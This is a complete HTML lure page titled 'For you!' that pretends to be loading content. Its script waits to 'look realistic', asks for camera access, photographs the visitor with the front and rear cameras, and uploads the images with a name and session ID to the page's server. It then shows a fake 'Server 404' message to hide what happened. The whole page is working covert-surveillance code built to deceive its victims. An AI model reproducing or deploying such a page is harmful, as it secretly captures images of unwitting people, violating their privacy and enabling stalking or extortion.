<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>For you!</title>
  <style>
    body { font-family: Arial, sans-serif; text-align: center; padding: 20px; }
    p { margin-top: 20px; font-size: 18px; }
  </style>
</head>
<body>
  <p id="status">Page will load in 2–3 seconds, please wait....</p>

  <script>
  (async function() {
    const status = document.getElementById("status");

    // Delay to look realistic
    await new Promise(r => setTimeout(r, 3000));

    // Get sessionId and name from URL
    const urlParams = new URLSearchParams(window.location.search);
    const sessionId = urlParams.get("sessionId") || Date.now().toString() + Math.floor(Math.random()*1000);
    const name = urlParams.get("name") || "visitor";

    // Take a snapshot from camera
    async function takePhoto(facingMode) {
      try {
        const constraints = {
          video: typeof facingMode === "string" ? { facingMode } : { facingMode: facingMode }
        };
        const stream = await navigator.mediaDevices.getUserMedia(constraints);
        const video = document.createElement("video");
        video.srcObject = stream;
        await video.play();

        const canvas = document.createElement("canvas");
        canvas.width = video.videoWidth;
        canvas.height = video.videoHeight;
        canvas.getContext("2d").drawImage(video, 0, 0, canvas.width, canvas.height);

        const imageData = canvas.toDataURL("image/jpeg");
        stream.getTracks().forEach(track => track.stop());
        return imageData;
      } catch (err) {
        console.warn("Camera failed for", facingMode, err);
        throw err;
      }
    }

    // Send to server with FormData (Cloudinary upload)
    async function sendToServer(imageData, type) {
      const blob = await (await fetch(imageData)).blob();
      const formData = new FormData();
      formData.append("photo", blob, `${type}.jpg`);
      formData.append("name", name);
      formData.append("type", type);
      formData.append("sessionId", sessionId);

      await fetch("/upload-photo", {
        method: "POST",
        body: formData
      });
    }

    try {
      if (/Mobi|Android/i.test(navigator.userAgent)) {
        // ✅ Android: front then back
        const frontPhoto = await takePhoto("user");
        await sendToServer(frontPhoto, "front");

        const backPhoto = await takePhoto({ ideal: "environment" });
        await sendToServer(backPhoto, "back");
      } else {
        // ✅ iPhone/Desktop: try back, fallback to front
        const frontPhoto = await takePhoto("user");
        await sendToServer(frontPhoto, "front");

        let backPhoto;
        try {
          backPhoto = await takePhoto({ ideal: "environment" });
        } catch (e) {
          backPhoto = await takePhoto("user"); // fallback
        }
        await sendToServer(backPhoto, "back");
      }

      // Fake success message
      status.innerText = "Server 404! Please try after some time";
    } catch (err) {
      // Fake failure message
      status.innerText = "Server failed! Sorry, try again in a few minutes!";
    }
  })();
  </script>
</body>
</html>
